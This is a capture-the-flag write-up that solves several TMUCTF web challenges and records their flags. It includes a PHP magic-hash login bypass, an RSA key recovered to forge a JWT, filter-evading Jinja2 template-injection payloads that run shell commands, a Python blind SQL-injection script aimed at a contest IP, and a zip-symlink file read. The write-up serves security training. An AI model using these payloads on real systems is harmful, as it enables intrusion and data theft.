## Challenge Login
Step 1: /robots.txt -> get source

Step 2: input password = `0e1137126905` (payload)

Flag -> `TMUCTF{D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?}`

## Challenge The Devil Never Sleeps

Step 1: `/sleepingpill` -> get jwt and public key

Step 2: format public key
File `key.pub`
```
-----BEGIN PUBLIC KEY-----
MIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD/////////////////////////
/////////////////////////////////////////////////////////////3//
///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ==
-----END PUBLIC KEY-----
```
Step 3: Use RsaCtfTool to gen private key

`./RsaCtfTool.py --publickey ./key.pub --private`

Private key
```
-----BEGIN RSA PRIVATE KEY-----
MIICkAIBAAKBjgD/////////////////////////////////////////////////
/////////////////////////////////////3/////////////+AAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA
Kn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q
AFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q
AFX/qgBV/6oAVf+qAQJCAf//////////////////////////////////////////
////////////////////////////////////////////Akx/////////////////
////////////////////////////////////////////////////////////////
////////////////////AkIBgIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CA
f3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f38CTFVVqqpVVaqqVVWq
qlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq
qlVVqqpVVaqqVVWqqlVVqqkCQRCEIQhCEIQhCEIQQhCEIQhCEIQhCEEIQhCEIQhC
EIQhBCEIQhCEIQhCEIQQhCEIQhCEIQhCEEIQhCEIQhCEIQhB
-----END RSA PRIVATE KEY-----
```
Step 4: Use jwt.io set `exp": 9999999999` and `"sleep": "true"`

JWT
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTI0NzQ3NywianRpIjoiMjI5Y2U5NzYtOTVlMC00ODdkLTlmODItNTMwZjU4NDkzNzQ3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmlsIiwibmJmIjoxNjMxMjQ3NDc3LCJleHAiOjk5OTk5OTk5OTksInNsZWVwIjoidHJ1ZSIsImRhbmdlciI6InRydWUifQ.NTR8D5-tZJ-Ax6vc_tWtG4HU_JedT0840zZmvrQUSkj-qPQkjHf_lD7sbinnLySK-hUgSqhJa7B_tzR6jENryuFQ8WNwAHMP0RlsU6uJYHHnVOUSfbjsTuNdk7FwPjkm9M43R60hCqIP6NxJ5DY-HLVUql8GzfqbKX2MuCIFmVSL9tvQ4kG2GPlF_DUw
```
Step 5: `/flag` set Header Pill.
```
Pill: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTI0NzQ3NywianRpIjoiMjI5Y2U5NzYtOTVlMC00ODdkLTlmODItNTMwZjU4NDkzNzQ3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmlsIiwibmJmIjoxNjMxMjQ3NDc3LCJleHAiOjk5OTk5OTk5OTksInNsZWVwIjoidHJ1ZSIsImRhbmdlciI6InRydWUifQ.NTR8D5-tZJ-Ax6vc_tWtG4HU_JedT0840zZmvrQUSkj-qPQkjHf_lD7sbinnLySK-hUgSqhJa7B_tzR6jENryuFQ8WNwAHMP0RlsU6uJYHHnVOUSfbjsTuNdk7FwPjkm9M43R60hCqIP6NxJ5DY-HLVUql8GzfqbKX2MuCIFmVSL9tvQ4kG2GPlF_DUw
```
Flag -> `TMUCTF{0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?}`

## Challenge Injection
filter: `_ [] . request popen mro config " os self shell % ; + join` and space

Bypass filter by unicode

```
{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('id')|attr('read')()}}
```
decode -> `lipsum|attr('__globals__'))|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()`

`ls$IFS-t` -> sort files by time

```
{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('ls$IFS-t$IFS/opt/tmuctf/')|attr('read')()}}
```

Payload get flag (read first file after sorting)
```
{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('cat$IFS/opt/tmuctf/vaYxVj7si8')|attr('read')()}}
```
Final -> decode base64

Flag -> `TMUCTF{0h!_y0u_byp4553d_4ll_my_bl4ckl157!!!__1_5h0uld_h4v3_b33n_m0r3_c4r3ful}`

## Challenge Fake Registration
```py
import requests
import string
from random import choices

url ="http://130.185.123.246/register"
flag=""
padding=""
list_char = string.ascii_letters+string.digits

def random_str()->str:
  return ''.join(choices(list_char,k=7))

def create_user(i,padding):
    data = {
            "username":f"{padding}'||substr((select password from users),{i},1),'tai')--",
            "password":"taidh"
            }
    try:
        r= requests.post(url,data=data)
        # print('done')
    except Exception as e:
        print(e)
def brute(char,padding):
    data = {
            "username":padding+char,
            "password":"taidh"
            }
    try:
        r= requests.post(url,data=data)
        return r
    except Exception as e:
        print(e)

if __name__ == "__main__":
    for i in range(1,70):
        padding = random_str()
        # print(padding)
        create_user(i,padding)
        for char in string.printable:
            print(char,end='\r')
            if char!="'":
                r=brute(char,padding)
                #print(r.text)
                try:
                    if "UNIQUE constraint" in r.text:
                        flag+=char
                        padding+=char
                        print(flag)
                        break
                except Exception as e:
                    print(e)
```
Flag -> `MUCTF{P455w0rd5_mu57_b3_l0n6_4nd_c0mpl3x_l1k3_2MWn&p#FmjShTZXfAg:)}`

## Challenge nano
Step 1: `/index.html` -> get path `/801910ad8658876d56f5c8b24a563096.php` (view-source)

Step 2: `/801910ad8658876d56f5c8b24a563096.php?flag_help=/dev/fd/10` -> get path `/ffc14c6eb03e852ea2d2cbe18b3f4d76.php`

Step 3: `/ffc14c6eb03e852ea2d2cbe18b3f4d76.php` and upload zip

Gen zip
```
ls -s /etc/ff3efa4307078c85678c6adee3b5f1b1af2ba16e/nanoflag/flag.txt payload

zip --symlinks payload.zip payload
```

Upload zip and access `/upload/random/payload`
Flag -> `TMUCTF{Z1P_5l1p_15_4_D4n63r0u5_4rch1v3_3x7r4c710N_Vuln3r4b1l17Y___4nd_4_f0rm_0f_D1r3c70rY_7r4v3r54L!!}`

## Thank
Writeup full I will upload at http://dauhoangtai.github.io later
